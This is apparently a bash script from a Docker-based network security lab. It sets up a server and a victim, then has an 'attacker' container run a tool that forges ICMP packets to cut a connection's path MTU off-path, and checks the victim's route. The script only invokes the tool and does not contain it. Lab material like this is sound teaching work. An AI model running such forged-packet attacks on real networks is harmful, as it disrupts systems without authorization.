#!/usr/bin/env bash
set -euo pipefail
ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
source "${ROOT}/lib/capture_helpers.sh"
init_compose "p08v" "docker-compose.yml"
trap 'teardown_lab 2>/dev/null || true' EXIT

setup_lab
${COMPOSE} exec -d servidor python3 /lab/tcp_server.py >> "${SETUP_LOG}" 2>&1
sleep 1
${COMPOSE} exec -d victima python3 /lab/victim_demo.py 10.9.0.30 8080 14 45678 >> "${SETUP_LOG}" 2>&1
sleep 2

section "08" "ICMP OFF-PATH" "VULNERABLE"
prompt_attack "10.9.0.10" "python3 /lab/forge_icmp_mtu.py 10.9.0.20 10.9.0.20 10.9.0.30 45678 8080 1 576"
run_exec atacante python3 /lab/forge_icmp_mtu.py 10.9.0.20 10.9.0.20 10.9.0.30 45678 8080 1 576
sleep 2
blank_line
prompt_victim "10.9.0.20" "ip route get 10.9.0.30"
run_exec victima ip route get 10.9.0.30 2>/dev/null || true

teardown_lab
